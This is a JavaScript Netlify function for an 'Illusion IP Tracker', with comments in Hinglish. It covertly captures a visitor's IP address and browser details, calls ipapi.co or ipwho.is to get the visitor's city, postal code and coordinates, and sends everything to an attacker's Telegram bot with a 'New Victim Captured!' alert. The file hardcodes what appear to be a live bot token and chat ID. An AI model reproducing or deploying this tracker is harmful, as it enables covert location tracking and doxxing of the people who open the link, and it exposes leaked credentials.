// Netlify Function — IP Track + Telegram Forward
// Victim request receive karta hai, IP nikalta hai, geo fetch karta hai,
// aur Telegram bot pe send karta hai.

const https = require('https');

// ═══════════════════════════════════════════════════════════
const BOT_TOKEN = '8877858332:AAEPKeOW1dmPVZnWbMtihMMbYHgEDywToNU';
const CHAT_ID   = '5417010858';
// ═══════════════════════════════════════════════════════════

exports.handler = async (event) => {
    const headers = {
        'Access-Control-Allow-Origin': '*',
        'Access-Control-Allow-Headers': 'Content-Type',
        'Access-Control-Allow-Methods': 'POST, OPTIONS',
        'Content-Type': 'application/json'
    };

    if (event.httpMethod === 'OPTIONS') {
        return { statusCode: 200, headers, body: '' };
    }

    try {
        // ────── Victim's real IP from Netlify headers ──────
        const clientIP =
            event.headers['x-nf-client-connection-ip'] ||
            event.headers['client-ip'] ||
            (event.headers['x-forwarded-for'] || '').split(',')[0].trim() ||
            event.headers['x-real-ip'] ||
            'Unknown';

        // ────── Parse body ──────
        let body = {};
        try {
            body = event.body ? JSON.parse(event.body) : {};
        } catch (e) { body = {}; }

        const note      = body.note      || '';
        const brand     = body.brand     || '';
        const referrer  = body.referrer  || 'direct';
        const userAgent = body.userAgent || 'Unknown';
        const language  = body.language  || 'N/A';
        const screen    = body.screen    || 'N/A';
        const platform  = body.platform  || 'N/A';

        // ────── Fetch geolocation ──────
        let geo = {};
        try {
            geo = await getJSON(`https://ipapi.co/${clientIP}/json/`);
            if (geo.error || !geo.latitude) {
                const fb = await getJSON(`https://ipwho.is/${clientIP}`);
                if (fb && fb.success) {
                    geo = {
                        ip: fb.ip,
                        country_name: fb.country,
                        country_code: fb.country_code,
                        city: fb.city,
                        region: fb.region,
                        postal: fb.postal,
                        org: fb.connection ? fb.connection.org : 'N/A',
                        timezone: fb.timezone ? fb.timezone.id : 'N/A',
                        latitude: fb.latitude,
                        longitude: fb.longitude
                    };
                }
            }
        } catch (e) {
            geo = { error: e.message };
        }

        const now = new Date();
        const dateStr = now.toLocaleString('en-IN', {
            timeZone: 'Asia/Kolkata',
            dateStyle: 'medium',
            timeStyle: 'medium'
        });

        // ────── Telegram message ──────
        const tgMsg =
`🛡 *ILLUSION IP TRACKER* 🛡
━━━━━━━━━━━━━━━━━━━━━━━
🎯 *New Victim Captured!*

📌 *Note:* ${note || 'N/A'}
🏷 *Brand:* ${brand || 'N/A'}

🌐 *IP:* \`${clientIP}\`
🌍 *Country:* ${geo.country_name || 'N/A'} ${geo.country_code ? '('+geo.country_code+')' : ''}
🏙 *City:* ${geo.city || 'N/A'}
📍 *Region:* ${geo.region || 'N/A'}
📮 *Postal:* ${geo.postal || 'N/A'}
🏢 *ISP:* ${geo.org || 'N/A'}
⏰ *Timezone:* ${geo.timezone || 'N/A'}
🧭 *Coords:* ${geo.latitude || 'N/A'}, ${geo.longitude || 'N/A'}

💻 *UA:* \`${String(userAgent).substring(0, 80)}...\`
🖥 *Screen:* ${screen}
🗣 *Lang:* ${language}
⚙ *Platform:* ${platform}
🔗 *Referrer:* ${referrer}

🕐 *Time:* ${dateStr}
${geo.latitude ? `\n🗺 [Open in Maps](https://maps.google.com/?q=${geo.latitude},${geo.longitude})` : ''}
━━━━━━━━━━━━━━━━━━━━━━━
_Illusion IP Tracker_`;

        // ────── Send to Telegram ──────
        const tgUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        const tgResult = await postJSON(tgUrl, {
            chat_id: CHAT_ID,
            text: tgMsg,
            parse_mode: 'Markdown',
            disable_web_page_preview: false
        });

        return {
            statusCode: 200,
            headers,
            body: JSON.stringify({
                success: true,
                ip: clientIP,
                geo: geo,
                telegram_ok: !!(tgResult && tgResult.ok)
            })
        };

    } catch (err) {
        return {
            statusCode: 500,
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ success: false, error: err.message })
        };
    }
};

function getJSON(url) {
    return new Promise((resolve, reject) => {
        https.get(url, { headers: { 'User-Agent': 'Mozilla/5.0' } }, (res) => {
            let data = '';
            res.on('data', c => data += c);
            res.on('end', () => {
                try { resolve(JSON.parse(data)); }
                catch (e) { reject(e); }
            });
        }).on('error', reject);
    });
}

function postJSON(url, payload) {
    return new Promise((resolve, reject) => {
        const data = JSON.stringify(payload);
        const u = new URL(url);
        const req = https.request({
            hostname: u.hostname,
            path: u.pathname + u.search,
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Content-Length': Buffer.byteLength(data)
            }
        }, (res) => {
            let body = '';
            res.on('data', c => body += c);
            res.on('end', () => {
                try { resolve(JSON.parse(body)); }
                catch (e) { resolve({ raw: body }); }
            });
        });
        req.on('error', reject);
        req.write(data);
        req.end();
    });
}
